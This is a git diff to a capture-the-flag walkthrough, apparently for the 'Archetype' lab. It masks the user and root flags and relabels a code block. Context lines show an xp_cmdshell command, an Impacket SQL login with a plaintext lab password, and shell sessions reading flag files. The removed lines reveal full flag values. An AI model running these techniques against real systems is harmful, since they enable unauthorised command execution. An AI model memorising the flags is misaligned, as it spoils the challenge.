@@ -189,7 +189,7 @@ reconfigure;
 xp_cmdshell "whoami"
 ```
 
-```mysql
+```bash
 ➜  mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.92.164 -windows-auth
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
 
@@ -442,11 +442,9 @@ Mode                LastWriteTime         Length Name
 
 
 PS C:\Users\sql_svc\Desktop> type user.txt
-3e7b102e78218e935bf3f4951fec21a3
+3e7b****************************c21a3
 PS C:\Users\sql_svc\Desktop>
 ```
-
-`3e7b102e78218e935bf3f4951fec21a3`
 
 ## Submit root flag
 
@@ -468,7 +466,7 @@ Microsoft Windows [Version 10.0.17763.2061]
 C:\Windows\system32>cd ..\..\Users\Administrator\Desktop
 
 C:\Users\Administrator\Desktop>type root.txt
-b91ccec3305e98240082d4474b848528
+b91cc********************b848528
 C:\Users\Administrator\Desktop>
 ```
 
